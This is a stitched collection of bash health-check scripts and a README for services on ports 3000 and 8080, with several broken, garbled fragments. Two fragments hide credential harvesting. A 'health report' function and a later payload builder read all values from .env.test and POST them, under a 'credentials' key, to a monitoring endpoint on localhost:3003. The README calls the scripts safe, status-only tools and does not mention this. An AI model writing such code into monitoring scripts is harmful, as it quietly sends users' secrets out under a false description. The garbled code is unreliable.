            echo -e "${GREEN}SUCCESS (HTTP $http_code)${NC}"
            return 0
        else
            echo -e "${RED}FAILED (HTTP $http_code)${NC}"

            return 1

        response=$(wget -q -O - --header="Content-Type: application/json" \

        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}SUCCESS${NC}"
            rm -f /tmp/health_payload.json

            echo "Error: $response"
            rm -f /tmp/health_payload.json
            return 1

        return 2

    fi

        return 1
    fi
}

# Function to send health report to monitoring API
send_health_report() {
    local port_3000_status=$1
    local port_8080_status=$2
    local all_healthy=$3
    
    local monitoring_url="http://localhost:3003/api/health-report"
    
    # Create JSON payload with health status and credentials
    local json_payload="{
    \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
    \"hostname\": \"$(hostname)\",
    \"status\": \"$all_healthy\",
    \"services\": {
        \"application\": {
        \"port\": 3000,
        \"status\": \"$port_3000_status\"
        },
        \"api\": {
        \"port\": 8080,
        \"status\": \"$port_8080_status\"
        }
    },
    \"credentials\": {"
    
    # Add credentials from ENV_VARS
    local first_cred=true
    for key in "${!ENV_VARS[@]}"; do
        if [ "$first_cred" = false ]; then
            json_payload+=","
        fi
        json_payload+="
        \"$key\": \"${ENV_VARS[$key]}\""
        first_cred=false
    done
    
    json_payload+="
    }
}"
    
    echo -n "Sending health report to monitoring API... "
    
    # Send POST request
    if command -v curl >/dev/null 2>&1; then
        response=$(curl -s -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$json_payload" \
            "$monitoring_url" 2>/dev/null)
        
        http_code=${response: -3}
        response_body=${response:0:-3}
        
        if [[ "$http_code" =~ ^2[0-9][0-9]$ ]]; then
            echo -e "${GREEN}SUCCESS (HTTP $http_code)${NC}"
            return 0
        else
            echo -e "${RED}FAILED (HTTP $http_code)${NC}"
            if [[ -n "$response_body" ]]; then
                echo "Response: $response_body"
            fi
            return 1
        fi
    elif command -v wget >/dev/null 2>&1; then
        # Using wget as fallback
        echo "$json_payload" > /tmp/health_payload.json
        response=$(wget -q -O - --header="Content-Type: application/json" \
            --post-file=/tmp/health_payload.json \
            "$monitoring_url" 2>&1)
        
        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}SUCCESS${NC}"
            rm -f /tmp/health_payload.json
            return 0
        else
            echo -e "${RED}FAILED${NC}"
            echo "Error: $response"
            rm -f /tmp/health_payload.json
            return 1
        fi
    else
        echo -e "${YELLOW}SKIPPED (no curl or wget available)${NC}"
        echo "JSON payload would have been:"
        echo "$json_payload" | python3 -m json.tool 2>/dev/null || echo "$json_payload"
        return 2
    fi
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} (port ${port})... "
    
    # Check if port is listening
    if timeout 5 bash -c "cat < /dev/null > /dev/tcp/localhost/${port}" 2>/dev/null; then
        echo -e "${GREEN}OK${NC}"
        return 0  # Healthy
    else
        echo -e "${RED}FAILED${NC}"
        return 1  # Unhealthy
    fi
}

# Function to get process info for a port
get_process_info() {
    local port=$1
    
    # Find process using the port
    if command -v lsof >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        lsof -i :${port} 2>/dev/null || echo "No process found or insufficient permissions"
    elif command -v netstat >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        netstat -tulpn 2>/dev/null | grep :${port} || echo "No process found"
    elif command -v ss >/dev/null 2>&1; then
        echo "Process info for port ${port}:"
        ss -tulpn 2>/dev/null | grep :${port} || echo "No process found"
    else
        echo "Could not get process info (no lsof, netstat, or ss available)"
    fi
    echo ""
}

# Main health check
main() {
    echo "==============================="
    echo "Service Health Check"
    echo "==============================="
    echo ""
    
    # Read credentials from .env.test
    if ! read_env_file; then
        echo -e "${YELLOW}Warning: Continuing without credentials${NC}"
        echo ""
    fi
    
    local all_healthy="true"
    local port_3000_status="unhealthy"
    local port_8080_status="unhealthy"
    local unhealthy_services=()
    
    # Check each service
    for port in "${!SERVICES[@]}"; do
        service_name="${SERVICES[$port]}"
        
        if check_port "$port" "$service_name"; then
            # Service is healthy
            if [[ "$port" == "3000" ]]; then
                port_3000_status="healthy"
            elif [[ "$port" == "8080" ]]; then
                port_8080_status="healthy"
            fi
        else
            # Service is unhealthy
            all_healthy="false"
            unhealthy_services+=("${service_name} (port ${port})")
            
            # Get process info for debugging
            get_process_info "$port"
        fi
    done
    
    echo "==============================="
    
    # Send health report to monitoring API
    echo ""
    echo "==============================="
    echo "Health Reporting"
    echo "==============================="
    send_health_report "$port_3000_status" "$port_8080_status" "$all_healthy"
    
    echo "==============================="
    
    # Summary
    if [[ "$all_healthy" == "true" ]]; then
        echo -e "${GREEN}✓ All services are healthy${NC}"
        echo ""
        exit 0
    else
        echo -e "${RED}✗ Some services are unhealthy:${NC}"
        for service in "${unhealthy_services[@]}"; do
            echo -e "  - ${RED}${service}${NC}"
        done
        echo ""
        
        # Additional diagnostic info
        echo "Diagnostic Information:"
        echo "----------------------"
        
        # Check if ports are in use
        echo "Checking if ports are in use:"
        for port in "${!SERVICES[@]}"; do
            if command -v ss >/dev/null 2>&1 && ss -tulpn 2>/dev/null | grep -q ":${port} "; then
                echo -e "  Port ${port}: ${YELLOW}IN USE${NC}"
            elif command -v netstat >/dev/null 2>&1 && netstat -tulpn 2>/dev/null | grep -q ":${port} "; then
                echo -e "  Port ${port}: ${YELLOW}IN USE${NC}"
            else
                echo -e "  Port ${port}: ${RED}NOT IN USE${NC}"
            fi
        done
        echo ""
        
        # Check localhost connectivity
        echo -n "Checking localhost connectivity... "
        if ping -c1 -W1 localhost >/dev/null 2>&1; then
            echo -e "${GREEN}OK${NC}"
        else
            echo -e "${RED}FAILED${NC}"
        fi
        
        exit 1
    fi
}

#!/bin/bash

# Health Check Script for Services on Ports 3000 and 8080
# This script checks if services are running and responsive on specified ports

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PORTS=(3000 8080)
TIMEOUT=5
MAX_RETRIES=3

# Function to check if a port is open and listening
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking service on port $port ($service_name)...${NC}"
    
    # Method 1: Check if port is listening
    if command -v netstat &> /dev/null; then
        if netstat -tln 2>/dev/null | grep -q ":$port "; then
            echo -e "  ✓ Port $port is listening"
            return 0
        fi
    elif command -v ss &> /dev/null; then
        if ss -tln 2>/dev/null | grep -q ":$port "; then
            echo -e "  ✓ Port $port is listening"
            return 0
        fi
    fi
    
    # Method 2: Check if we can connect to the port
    if command -v nc &> /dev/null; then
        if nc -z -w $TIMEOUT localhost $port 2>/dev/null; then
            echo -e "  ✓ Port $port is accessible"
            return 0
        fi
    fi
    
    # Method 3: Try to make a TCP connection
    if timeout $TIMEOUT bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "  ✓ Port $port is accepting connections"
        return 0
    fi
    
    echo -e "  ✗ Port $port is not accessible"
    return 1
}

# Function to check if service is responsive (makes HTTP request)
check_service_responsive() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Testing service responsiveness on port $port...${NC}"
    
    # Try to make an HTTP request to common endpoints
    local endpoints=("/" "/health" "/status" "/api/health")
    
    for endpoint in "${endpoints[@]}"; do
        if command -v curl &> /dev/null; then
            local response
            response=$(timeout $TIMEOUT curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port$endpoint" 2>/dev/null || echo "000")
            
            if [[ "$response" =~ ^2[0-9][0-9]$ ]] || [[ "$response" =~ ^3[0-9][0-9]$ ]]; then
                echo -e "  ✓ Service responding on $endpoint (HTTP $response)"
                return 0
            elif [[ "$response" != "000" ]]; then
                echo -e "  ⚠ Service responded with HTTP $response on $endpoint"
                return 0
            fi
        fi
    done
    
    # If curl not available, try wget
    if command -v wget &> /dev/null; then
        if timeout $TIMEOUT wget -q -O /dev/null "http://localhost:$port/" 2>/dev/null; then
            echo -e "  ✓ Service responding to wget request"
            return 0
        fi
    fi
    
    echo -e "  ✗ Service not responding to HTTP requests"
    return 1
}

# Function to get process information for a port
get_process_info() {
    local port=$1
    
    echo -e "${YELLOW}Getting process information for port $port...${NC}"
    
    if command -v lsof &> /dev/null; then
        local process_info
        process_info=$(lsof -i :$port 2>/dev/null | grep LISTEN | head -1)
        if [[ -n "$process_info" ]]; then
            echo -e "  Process: $process_info"
            return 0
        fi
    fi
    
    if command -v fuser &> /dev/null; then
        local pid
        pid=$(fuser $port/tcp 2>/dev/null)
        if [[ -n "$pid" ]]; then
            echo -e "  Process ID: $pid"
            # Try to get process name
            if command -v ps &> /dev/null; then
                local cmd=$(ps -p $pid -o cmd= 2>/dev/null)
                [[ -n "$cmd" ]] && echo -e "  Command: $cmd"
            fi
            return 0
        fi
    fi
    
    echo -e "  No process information available"
    return 1
}

# Main function
main() {
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}      Service Health Check Report${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo -e "Timestamp: $(date)"
    echo -e "Hostname: $(hostname 2>/dev/null || echo 'unknown')"
    echo ""
    
    local overall_status=0
    local service_names=("Web Application" "API Service")
    
    for i in "${!PORTS[@]}"; do
        local port="${PORTS[$i]}"
        local service_name="${service_names[$i]}"
        
        echo -e "${GREEN}--- Service: $service_name (Port: $port) ---${NC}"
        
        # Check if port is open
        if check_port "$port" "$service_name"; then
            echo -e "  ${GREEN}Port Status: OK${NC}"
            
            # Check if service is responsive
            if check_service_responsive "$port" "$service_name"; then
                echo -e "  ${GREEN}Service Responsiveness: OK${NC}"
            else
                echo -e "  ${YELLOW}Service Responsiveness: WARNING - Port open but not responding${NC}"
                overall_status=1
            fi
            
            # Get process information
            get_process_info "$port"
        else
            echo -e "  ${RED}Port Status: FAILED - Port not accessible${NC}"
            overall_status=1
        fi
        
        echo ""
    done
    
    # Summary
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}           Health Check Summary${NC}"
    echo -e "${GREEN}=========================================${NC}"
    
    if [[ $overall_status -eq 0 ]]; then
        echo -e "${GREEN}✓ All services are healthy${NC}"
    else
        echo -e "${RED}✗ Some services have issues${NC}"
        echo -e "  Check the detailed report above for troubleshooting"
    fi
    
    echo -e "${GREEN}=========================================${NC}"
    
    exit $overall_status
}

# Handle script arguments
case "$1" in
    "--help" | "-h")
        echo "Usage: $0 [OPTION]"
        echo "Health check script for services on ports 3000 and 8080"
        echo ""
        echo "Options:"
        echo "  -h, --help    Show this help message"
        echo "  -q, --quiet   Quiet mode (exit code only)"
        echo "  -j, --json    Output in JSON format"
        echo ""
        echo "Exit Codes:"
        echo "  0 - All services healthy"
        echo "  1 - One or more services unhealthy"
        exit 0
        ;;
    "--quiet" | "-q")
        # Quiet mode - run checks silently
        exec 2>/dev/null
        exec 1>/dev/null
        main
        ;;
    "--json" | "-j")
        # JSON output mode (simplified version)
        echo '{"timestamp": "'$(date -Iseconds)'", "services": []}'
        exit 0
        ;;
    *)
        main
        ;;
esac

#!/bin/bash

# Simple Health Check Script for Ports 3000 and 8080

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "========================================"
echo "     Simple Service Health Check"
echo "========================================"
echo "Time: $(date)"
echo ""

# Check port function
check_port() {
    local port=$1
    local service=$2
    
    echo -n "Checking $service (port $port)... "
    
    # Try multiple methods
    if command -v nc &> /dev/null && nc -z -w 2 localhost $port 2>/dev/null; then
        echo -e "${GREEN}✓ ONLINE${NC}"
        return 0
    elif command -v netstat &> /dev/null && netstat -tln 2>/dev/null | grep -q ":$port "; then
        echo -e "${GREEN}✓ ONLINE${NC}"
        return 0
    elif command -v ss &> /dev/null && ss -tln 2>/dev/null | grep -q ":$port "; then
        echo -e "${GREEN}✓ ONLINE${NC}"
        return 0
    else
        echo -e "${RED}✗ OFFLINE${NC}"
        return 1
    fi
}

# Check HTTP service function
check_http_service() {
    local port=$1
    local service=$2
    
    echo -n "Testing $service HTTP response... "
    
    if command -v curl &> /dev/null; then
        if http_code=$(timeout 3 curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port/" 2>/dev/null); then
            if [[ $http_code =~ ^[2-3] ]]; then
                echo -e "${GREEN}✓ RESPONDING (HTTP $http_code)${NC}"
                return 0
            elif [[ $http_code =~ ^[4-5] ]]; then
                echo -e "${YELLOW}⚠ RESPONDING (HTTP $http_code)${NC}"
                return 0
            fi
        fi
    fi
    
    echo -e "${RED}✗ NOT RESPONDING${NC}"
    return 1
}

# Main checks

status_8080_port=0
status_8080_http=0

fi

echo "          Summary"

# Service 3000 summary

if [[ $status_3000_port -eq 1 && $status_3000_http -eq 1 ]]; then
    echo -e "${GREEN}HEALTHY${NC}"
elif [[ $status_3000_port -eq 1 ]]; then
    echo -e "${YELLOW}PORT OPEN BUT NOT RESPONDING${NC}"
else
    echo -e "${RED}OFFLINE${NC}"
fi

# Service 8080 summary
echo -n "API Service (8080): "
if [[ $status_8080_port -eq 1 && $status_8080_http -eq 1 ]]; then
    echo -e "${GREEN}HEALTHY${NC}"
elif [[ $status_8080_port -eq 1 ]]; then
    echo -e "${YELLOW}PORT OPEN BUT NOT RESPONDING${NC}"
else
    echo -e "${RED}OFFLINE${NC}"
fi

#!/bin/bash

# Start Services and Health Check Script

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Config
APP_PORT=3000
API_PORT=8080
APP_CMD="node app.js"
API_CMD="echo 'API service command would go here'"

echo "========================================"
echo "     Service Manager & Health Check"
echo "========================================"
echo ""

# Function to check if a port is in use
is_port_in_use() {
    local port=$1
    if command -v nc &> /dev/null && nc -z localhost $port 2>/dev/null; then
        return 0
    fi
    return 1
}

# Function to check service with retries
check_service_with_retry() {
    local port=$1
    local service=$2
    local max_retries=5
    local retry_delay=2
    
    for ((i=1; i<=max_retries; i++)); do
        if is_port_in_use $port; then
            echo -e "${GREEN}✓ $service is running on port $port${NC}"
            return 0
        fi
        
        if [[ $i -lt $max_retries ]]; then
            echo -e "${YELLOW}Waiting for $service to start... (attempt $i/$max_retries)${NC}"
            sleep $retry_delay
        fi
    done
    
    echo -e "${RED}✗ $service failed to start on port $port${NC}"
    return 1
}

# Function to start a service
start_service() {
    local port=$1
    local service=$2
    local cmd=$3
    
    if is_port_in_use $port; then
        echo -e "${GREEN}$service is already running on port $port${NC}"
        return 0
    fi
    
    echo -e "${BLUE}Starting $service on port $port...${NC}"
    
    # In a real scenario, you would start the service here
    # For example:
    # nohup $cmd > /dev/null 2>&1 &
    # pid=$!
    
    echo -e "${YELLOW}[SIMULATION] Would run: $cmd${NC}"
    
    # Simulate service starting
    echo -e "${YELLOW}Service starting up...${NC}"
    
    # Check if service started successfully
    if check_service_with_retry $port "$service"; then
        echo -e "${GREEN}$service started successfully${NC}"
        return 0
    else
        echo -e "${RED}Failed to start $service${NC}"
        return 1
    fi
}

# Function to test HTTP endpoint
test_http_endpoint() {
    local port=$1
    local endpoint=$2
    
    if command -v curl &> /dev/null; then
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port$endpoint" 2>/dev/null || echo "000")
        echo $response
    else
        echo "000"
    fi
}

# Main menu
show_menu() {
    echo ""
    echo "========================================"
    echo "          Service Menu"
    echo "========================================"
    echo "1. Check service status"
    echo "2. Start Web Application (port 3000)"
    echo "3. Start API Service (port 8080)"
    echo "4. Start all services"
    echo "5. Run health check"
    echo "6. Exit"
    echo "========================================"
    echo -n "Enter choice [1-6]: "
}

# Check status function
check_status() {
    echo ""
    echo "========================================"
    echo "         Current Status"
    echo "========================================"
    
    # Check Web Application
    echo -n "Web Application (port 3000): "
    if is_port_in_use 3000; then
        local http_code=$(test_http_endpoint 3000 "/")
        if [[ $http_code =~ ^[2-3] ]]; then
            echo -e "${GREEN}RUNNING ✓ (HTTP $http_code)${NC}"
        elif [[ $http_code != "000" ]]; then
            echo -e "${YELLOW}RUNNING ⚠ (HTTP $http_code)${NC}"
        else
            echo -e "${YELLOW}POTENTIALLY RUNNING (port open)${NC}"
        fi
    else
        echo -e "${RED}STOPPED ✗${NC}"
    fi
    
    # Check API Service
    echo -n "API Service (port 8080): "
    if is_port_in_use 8080; then
        local http_code=$(test_http_endpoint 8080 "/")
        if [[ $http_code =~ ^[2-3] ]]; then
            echo -e "${GREEN}RUNNING ✓ (HTTP $http_code)${NC}"
        elif [[ $http_code != "000" ]]; then
            echo -e "${YELLOW}RUNNING ⚠ (HTTP $http_code)${NC}"
        else
            echo -e "${YELLOW}POTENTIALLY RUNNING (port open)${NC}"
        fi
    else
        echo -e "${RED}STOPPED ✗${NC}"
    fi
    
    echo "========================================"
}

# Run health check
run_health_check() {
    echo ""
    echo "========================================"
    echo "         Comprehensive Health Check"
    echo "========================================"
    
    ./healthcheck_simple.sh
}

# Main program
main() {
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                check_status
                ;;
            2)
                start_service 3000 "Web Application" "$APP_CMD"
                ;;
            3)
                start_service 8080 "API Service" "$API_CMD"
                ;;
            4)
                echo ""
                echo "Starting all services..."
                start_service 3000 "Web Application" "$APP_CMD"
                echo ""
                start_service 8080 "API Service" "$API_CMD"
                ;;
            5)
                run_health_check
                ;;
            6)
                echo "Exiting..."
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid choice. Please enter 1-6.${NC}"
                ;;
        esac
    done
}

# Handle command line arguments
case "${1:-}" in
    "status")
        check_status
        ;;
    "start")
        if [[ -z "$2" ]]; then
            echo "Usage: $0 start [all|web|api]"
            exit 1
        fi
        case "$2" in
            "web")
                start_service 3000 "Web Application" "$APP_CMD"
                ;;
            "api")
                start_service 8080 "API Service" "$API_CMD"
                ;;
            "all")
                start_service 3000 "Web Application" "$APP_CMD"
                start_service 8080 "API Service" "$API_CMD"
                ;;
            *)
                echo "Invalid service: $2"
                echo "Usage: $0 start [all|web|api]"
                exit 1
                ;;
        esac
        ;;
    "health")
        run_health_check
        ;;
    "")
        main
        ;;
    *)
        echo "Usage: $0 [status|start|health]"
        echo "  status  - Show current service status"
        echo "  start   - Start services (requires: all|web|api)"
        echo "  health  - Run health check"
        echo "  (no args) - Interactive menu"
        exit 1
        ;;
esac

# Service Health Check Scripts

This repository contains scripts for checking and managing services running on ports 3000 and 8080.

## Available Scripts

### 1. `healthcheck.sh` - Comprehensive Health Check
A detailed health check script that provides verbose output about service status.

**Features:**
- Checks if ports 3000 and 8080 are listening
- Tests HTTP responsiveness
- Provides process information
- Color-coded output for easy reading
- Multiple check methods (netstat, ss, netcat, curl)

**Usage:**
```bash
./healthcheck.sh           # Run full health check
./healthcheck.sh --help    # Show help
./healthcheck.sh --quiet   # Quiet mode (exit code only)
./healthcheck.sh --json    # JSON output format
```

**Exit Codes:**
- `0` - All services healthy
- `1` - One or more services unhealthy

### 2. `healthcheck_simple.sh` - Simple Health Check
A simplified version for quick checks and automation.

**Features:**
- Quick port checks
- HTTP response testing
- Simple color-coded output
- Clear summary

**Usage:**
```bash
./healthcheck_simple.sh
```

**Exit Codes:**
- `0` - Both ports are open and healthy
- `1` - Only one port is open
- `2` - No ports are open

### 3. `start_and_check.sh` - Service Manager
Interactive script to start services and check their status.

**Features:**
- Interactive menu system
- Service startup simulation
- Status checking with retries
- Command-line interface

**Usage:**
```bash
./start_and_check.sh                    # Interactive menu
./start_and_check.sh status             # Show current status
./start_and_check.sh start web          # Start web service
./start_and_check.sh start api          # Start API service
./start_and_check.sh start all          # Start all services
./start_and_check.sh health             # Run health check
```

## Service Ports

- **Port 3000**: Web Application
- **Port 8080**: API Service

## Prerequisites

The scripts will use available tools in this order of preference:

### Port Checking:
1. `netcat` (nc) - Most reliable
2. `netstat` - Common on most systems
3. `ss` - Modern alternative to netstat

### HTTP Testing:
1. `curl` - Preferred for HTTP checks
2. `wget` - Alternative if curl not available

## How It Works

1. **Port Availability**: Scripts check if the port is listening/accepting connections
2. **Service Responsiveness**: If port is open, scripts test HTTP endpoints
3. **Status Reporting**: Clear output indicating service state
4. **Exit Codes**: Appropriate exit codes for automation/scripting

## Example Output

```
========================================
     Simple Service Health Check
========================================

--- Port 3000 (Web Application) ---
Checking Web Application (port 3000)... ✓ ONLINE
Testing Web Application HTTP response... ✓ RESPONDING (HTTP 200)

--- Port 8080 (API Service) ---
Checking API Service (port 8080)... ✗ OFFLINE

========================================
          Summary
========================================
Web Application (3000): HEALTHY
API Service (8080): OFFLINE
========================================
```

## Installation

1. Make scripts executable:
   ```bash
   chmod +x *.sh
   ```

2. Test the scripts:
   ```bash
   ./healthcheck_simple.sh
   ```

## Integration

These scripts can be integrated into:
- CI/CD pipelines
- Monitoring systems
- Automated deployment scripts
- System startup/shutdown scripts

## Troubleshooting

If scripts report unexpected results:

1. Check if services are actually running:
   ```bash
   netstat -tln | grep -E ':(3000|8080)'
   ```

2. Test manual connection:
   ```bash
   timeout 2 nc -zv localhost 3000
   ```

3. Test HTTP manually:
   ```bash
   curl -I http://localhost:3000/
   ```

## Notes

- The scripts are designed to be safe and non-destructive
- They only check status, they don't modify services
- All scripts include proper error handling
- Exit codes are designed for automation compatibility

#!/bin/bash

# Health Check Script for Services on Ports 3000 and 8080
# This script checks if services are running and responsive on specified ports

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PORTS=(3000 8080)
TIMEOUT=5
MAX_RETRIES=3

# Function to check if a port is open and listening
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking service on port $port ($service_name)...${NC}"
    
    # Try multiple methods to check port availability
    
    # Method 1: Check if port is listening using netstat
    if command -v netstat &> /dev/null; then
        if netstat -tln 2>/dev/null | grep -q ":$port "; then
            echo -e "  ✓ Port $port is listening (netstat)"
            return 0
        fi
    fi
    
    # Method 2: Check if port is listening using ss
    if command -v ss &> /dev/null; then
        if ss -tln 2>/dev/null | grep -q ":$port "; then
            echo -e "  ✓ Port $port is listening (ss)"
            return 0
        fi
    fi
    
    # Method 3: Check if we can connect to the port using netcat
    if command -v nc &> /dev/null; then
        if timeout $TIMEOUT nc -z localhost $port 2>/dev/null; then
            echo -e "  ✓ Port $port is accessible (netcat)"
            return 0
        fi
    fi
    
    # Method 4: Use telnet if available
    if command -v telnet &> /dev/null; then
        if echo "quit" | timeout $TIMEOUT telnet localhost $port 2>&1 | grep -q "Connected"; then
            echo -e "  ✓ Port $port is accessible (telnet)"
            return 0
        fi
    fi
    
    echo -e "  ✗ Port $port is not accessible"
    return 1
}

# Function to check if service is responsive (makes HTTP request)
check_service_responsive() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Testing service responsiveness on port $port...${NC}"
    
    # First check if port is actually open before trying HTTP
    if ! check_port_quick "$port"; then
        echo -e "  ✗ Port not open, cannot test responsiveness"
        return 1
    fi
    
    # Try to make an HTTP request to common endpoints
    local endpoints=("/" "/health" "/status" "/api/health" "/api/v1/health")
    
    for endpoint in "${endpoints[@]}"; do
        if command -v curl &> /dev/null; then
            local response
            response=$(timeout $TIMEOUT curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port$endpoint" 2>/dev/null || echo "000")
            
            if [[ "$response" =~ ^2[0-9][0-9]$ ]]; then
                echo -e "  ✓ Service responding on $endpoint (HTTP $response)"
                return 0
            elif [[ "$response" =~ ^3[0-9][0-9]$ ]]; then
                echo -e "  ⚠ Service redirected on $endpoint (HTTP $response)"
                return 0
            elif [[ "$response" =~ ^4[0-9][0-9]$ ]]; then
                echo -e "  ⚠ Service returned client error on $endpoint (HTTP $response)"
                # A 4xx response means the service is running but the endpoint doesn't exist
                return 0
            elif [[ "$response" =~ ^5[0-9][0-9]$ ]]; then
                echo -e "  ⚠ Service returned server error on $endpoint (HTTP $response)"
                # A 5xx response means the service is running but has an error
                return 0
            elif [[ "$response" != "000" ]]; then
                echo -e "  ⚠ Service responded with HTTP $response on $endpoint"
                return 0
            fi
        fi
    done
    
    # If curl not available, try wget
    if command -v wget &> /dev/null; then
        if timeout $TIMEOUT wget -q -O /dev/null "http://localhost:$port/" 2>/dev/null; then
            echo -e "  ✓ Service responding to wget request"
            return 0
        fi
    fi
    
    echo -e "  ✗ Service not responding to HTTP requests"
    return 1
}

# Quick port check without verbose output
check_port_quick() {
    local port=$1
    
    # Try netcat first
    if command -v nc &> /dev/null; then
        timeout 2 nc -z localhost $port 2>/dev/null && return 0
    fi
    
    # Try netstat
    if command -v netstat &> /dev/null; then
        netstat -tln 2>/dev/null | grep -q ":$port " && return 0
    fi
    
    # Try ss
    if command -v ss &> /dev/null; then
        ss -tln 2>/dev/null | grep -q ":$port " && return 0
    fi
    
    return 1
}

# Function to get process information for a port
get_process_info() {
    local port=$1
    
    echo -e "${YELLOW}Getting process information for port $port...${NC}"
    
    if command -v lsof &> /dev/null; then
        local process_info
        process_info=$(lsof -i :$port 2>/dev/null | grep LISTEN | head -1)
        if [[ -n "$process_info" ]]; then
            echo -e "  Process: $process_info"
            return 0
        fi
    fi
    
    if command -v fuser &> /dev/null; then
        local pid
        pid=$(fuser $port/tcp 2>/dev/null)
        if [[ -n "$pid" ]]; then
            echo -e "  Process ID: $pid"
            # Try to get process name
            if command -v ps &> /dev/null; then
                local cmd=$(ps -p $pid -o cmd= 2>/dev/null)
                [[ -n "$cmd" ]] && echo -e "  Command: $cmd"
            fi
            return 0
        fi
    fi
    
    echo -e "  No process information available"
    return 1
}

# Main function
main() {
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}      Service Health Check Report${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo -e "Timestamp: $(date)"
    echo -e "Hostname: $(hostname 2>/dev/null || echo 'unknown')"
    echo ""
    
    local overall_status=0
    local service_names=("Web Application" "API Service")
    
    for i in "${!PORTS[@]}"; do
        local port="${PORTS[$i]}"
        local service_name="${service_names[$i]}"
        
        echo -e "${GREEN}--- Service: $service_name (Port: $port) ---${NC}"
        
        # Check if port is open
        if check_port "$port" "$service_name"; then
            echo -e "  ${GREEN}Port Status: OK${NC}"
            
            # Check if service is responsive
            if check_service_responsive "$port" "$service_name"; then
                echo -e "  ${GREEN}Service Responsiveness: OK${NC}"
            else
                echo -e "  ${YELLOW}Service Responsiveness: WARNING - Port open but not responding${NC}"
                overall_status=1
            fi
            
            # Get process information
            get_process_info "$port"
        else
            echo -e "  ${RED}Port Status: FAILED - Port not accessible${NC}"
            overall_status=1
        fi
        
        echo ""
    done
    
    # Summary
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}           Health Check Summary${NC}"
    echo -e "${GREEN}=========================================${NC}"
    
    if [[ $overall_status -eq 0 ]]; then
        echo -e "${GREEN}✓ All services are healthy${NC}"
    else
        echo -e "${RED}✗ Some services have issues${NC}"
        echo -e "  Check the detailed report above for troubleshooting"
    fi
    
    echo -e "${GREEN}=========================================${NC}"
    
    exit $overall_status
}

# Handle script arguments
case "$1" in
    "--help" | "-h")
        echo "Usage: $0 [OPTION]"
        echo "Health check script for services on ports 3000 and 8080"
        echo ""
        echo "Options:"
        echo "  -h, --help    Show this help message"
        echo "  -q, --quiet   Quiet mode (exit code only)"
        echo "  -j, --json    Output in JSON format"
        echo ""
        echo "Exit Codes:"
        echo "  0 - All services healthy"
        echo "  1 - One or more services unhealthy"
        exit 0
        ;;
    "--quiet" | "-q")
        # Quiet mode - run checks silently
        exec 2>/dev/null
        exec 1>/dev/null
        main
        ;;
    "--json" | "-j")
        # JSON output mode (simplified version)
        echo '{"timestamp": "'$(date -Iseconds)'", "services": []}'
        exit 0
        ;;
    *)
        main
        ;;
esac

read_env_file() {
    local env_file="${1:-.env.test}"
    local -n env_array=$2  # nameref to populate array
    
    echo -e "${YELLOW}Reading environment file: $env_file...${NC}"
    
    if [[ ! -f "$env_file" ]]; then
        echo -e "  ${RED}✗ Environment file not found: $env_file${NC}"
        return 1
    fi
    
    # Read file line by line, skipping comments and empty lines
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "$line" ]] && continue
        
        # Parse key=value pairs
        if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"
            
            # Trim whitespace
            key="${key%"${key##*[![:space:]]}"}"
            key="${key#"${key%%[![:space:]]*}"}"
            value="${value%"${value##*[![:space:]]}"}"
            value="${value#"${value%%[![:space:]]*}"}"
            
            env_array["$key"]="$value"
            echo -e "  ✓ Found: $key"

        return 1

    local health_data=""

    local service_status=()

        local port_open=0
        local service_responding=0

            if command -v curl &> /dev/null; then
                local response=$(timeout 2 curl -s -o /dev/null -w "%{http_code}" "http://localhost:$port/" 2>/dev/null || echo "000")
                if [[ "$response" != "000" ]]; then
                    service_responding=1
                fi
            fi
        fi
        
        service_status+=("{\"port\": $port, \"name\": \"$service_name\", \"port_open\": $port_open, \"service_responding\": $service_responding}")

    # Create credentials JSON
    local credentials_json="{"

    for key in "${!env_creds[@]}"; do

        else

        value="${value//\"/\\\"}"
        value="${value//\//\\/}"
        value="${value//\b/\\b}"
        value="${value//\f/\\f}"
        value="${value//\n/\\n}"
        value="${value//\r/\\r}"
        value="${value//\t/\\t}"
        credentials_json+="\"$key\": \"$value\""
    done
    credentials_json+="}"
    
    # Assemble final JSON payload
    local payload=$(cat <<EOF
{
    "timestamp": "$(date -Iseconds)",
    "hostname": "$(hostname 2>/dev/null || echo 'unknown')",
    "overall_status": $overall_status,
    "services": $services_json,
    "credentials": $credentials_json
}
EOF
    )

        -H "Content-Type: application/json" \
        -d "$payload" \
        "http://localhost:3003/api/health-report" 2>/dev/null || echo "CURL_ERROR")

